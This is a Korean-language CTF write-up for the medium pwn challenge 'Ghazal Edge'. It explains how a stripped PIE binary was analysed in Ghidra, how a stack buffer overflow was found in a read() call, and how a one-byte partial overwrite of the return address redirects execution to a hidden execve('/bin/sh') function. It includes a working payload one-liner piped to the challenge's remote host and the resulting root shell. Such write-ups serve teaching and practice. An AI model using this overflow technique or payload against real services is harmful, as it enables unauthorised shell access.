---
ctf_name: "2026-0xV01D-CTF"
challenge_name: "Ghazal Edge"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "medium"      # easy / medium / hard / insane
author: "laneeeey"
date: "2026-05-20"
points: 100
tags: [stack-overflow, ret2win, partial-overwrite]
---

# 문제명

## 문제 설명

> A compact service accepts one record and then leaves through a narrow exit path. The public binary is the contract.

- Remote: `nc 34.62.69.250 41051`
- Flag format: `0xV01D{...}`

## 풀이

### 분석

분석

문제에서 제공된 파일을 확인하면 no_eyes 바이너리, run.sh, Dockerfile, flag.example, libc.so.6, ld-linux-x86-64.so.2가 존재한다.

먼저 file 명령어로 no_eyes 파일을 확인했다.

file no_eyes

실행 결과 no_eyes는 ELF 64-bit LSB pie executable, x86-64 바이너리이며, dynamically linked 방식으로 동작하고 stripped 상태임을 확인할 수 있었다. 따라서 해당 파일은 macOS에서 직접 실행되는 파일이 아니라 Linux x86-64 환경에서 실행되는 pwn 바이너리이다.

run.sh의 내용은 다음과 같다.

#!/bin/sh
cd "$(dirname "$0")"
cp -f flag.example flag.txt 2>/dev/null || true
exec ./no_eyes

run.sh는 실행 위치를 문제 파일이 있는 디렉토리로 옮긴 뒤, flag.example을 flag.txt로 복사하고 최종적으로 ./no_eyes를 실행한다. 따라서 실제 분석 대상은 no_eyes 바이너리이다.

Dockerfile을 확인하면 socat을 이용해 41051 포트로 접속을 받고, 접속이 들어오면 run.sh를 실행하는 구조이다. 즉 원격 서버에 nc로 접속하면 socat이 run.sh를 실행하고, run.sh가 no_eyes를 실행한다.

strings 명령어로 바이너리 내부 문자열을 확인했다.

strings -a no_eyes

확인된 주요 문자열은 다음과 같다.

read
execve
You found it!
/bin/sh
Input:
Welcome
Return reached safely

여기서 execve, /bin/sh, You found it! 문자열이 존재하므로, 쉘을 실행하는 숨겨진 함수가 있을 가능성이 있다고 판단했다.

Ghidra로 no_eyes를 분석한 결과, FUN_0010122a 함수에서 다음 동작을 확인할 수 있었다.

puts("You found it!");
execve("/bin/sh", (char **)0x0, (char **)0x0);

이 함수는 실행되면 "You found it!"을 출력한 뒤 /bin/sh를 실행한다. 따라서 이 함수를 win 함수로 볼 수 있다.

win 함수의 시작 주소는 0x0010122a이다.

입력을 받는 함수 FUN_0010125d에서는 다음 코드가 확인되었다.

read(0, local_28, 0x100);

어셈블리에서는 local_28이 rbp-0x20 위치에 존재하는 것을 확인할 수 있었다.

즉 0x20 바이트 크기의 스택 버퍼에 최대 0x100 바이트를 입력받는 구조이다.

### 취약점

취약점은 read() 함수에서 발생하는 stack buffer overflow이다.

local_28은 rbp-0x20 위치에 존재하는 32바이트 크기의 지역 버퍼이다. 하지만 read(0, local_28, 0x100)을 통해 최대 256바이트까지 입력받는다. 따라서 버퍼 크기보다 큰 입력을 넣으면 local_28 뒤에 있는 saved RBP와 saved RIP까지 덮을 수 있다.

스택 구조는 다음과 같이 볼 수 있다.

local_28 buffer: 0x20 bytes
saved RBP: 0x08 bytes
saved RIP

따라서 saved RIP까지의 offset은 0x20 + 0x8 = 0x28

일반적인 ret2win 문제라면 saved RIP를 win 함수 주소로 덮으면 된다. 하지만 이 바이너리는 PIE가 적용되어 있기 때문에 실행 시 실제 코드 주소가 랜덤화된다.

다만 이 문제에서는 partial overwrite를 사용할 수 있다.

Ghidra에서 FUN_0010125d는 FUN_00101296 함수 내부의 0x001012e4 위치에서 호출된다. call 명령어는 실행 시 다음 명령어의 주소를 return address로 스택에 저장한다. call 명령어의 길이는 5바이트이므로, FUN_0010125d가 정상적으로 리턴할 주소는 0x001012e9이다.

정상 복귀 주소: 0x12e9
win 함수 주소: 0x122a

두 주소는 같은 PIE base를 공유하고, 하위 1바이트만 다르다.

0x12e9 → 0x122a
e9 → 2a

따라서 saved RIP 전체를 덮지 않고, saved RIP의 하위 1바이트만 0x2a로 덮으면 실행 흐름을 win 함수로 이동시킬 수 있다.

### 익스플로잇

payload 구조는 다음과 같다.

"A" * 40 + "\x2a"

A 40바이트는 local_28 버퍼와 saved RBP를 채우기 위한 padding이다. 그 뒤의 \x2a는 saved RIP의 하위 1바이트를 기존 0xe9에서 0x2a로 변경하기 위한 값이다.

(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + b"\x2a")'; cat) | nc 34.62.69.250 41051

실행 결과 다음과 같이 win 함수에 도달한 것을 확인했다.

Welcome
Input: You found it!

이후 쉘이 정상적으로 열렸는지 확인하기 위해 whoami 명령어를 입력했다.

실행 결과 root가 출력되었고, 이를 통해 쉘을 획득했음을 확인할 수 있었다.

그 다음 flag.txt 파일을 읽었다.

cat flag.txt

이를 통해 최종 플래그를 획득할 수 있었다.

## 플래그

```
flag{REDACTED}
```

## 배운 점

기존에는 주로 소스코드가 제공된 pwn 문제를 풀었기 때문에 취약한 코드 위치를 비교적 쉽게 확인할 수 있었다. 하지만 이번 문제는 소스코드 없이 바이너리만 제공되어, Ghidra를 사용해 직접 함수 흐름을 분석해야 했다. 처음에는 stripped 바이너리라 함수 이름이 보이지 않아 헷갈렸지만, strings 결과에서 확인한 Input:, You found it!, /bin/sh 문자열을 기준으로 XREF를 따라가며 입력 함수와 win 함수를 찾을 수 있었다.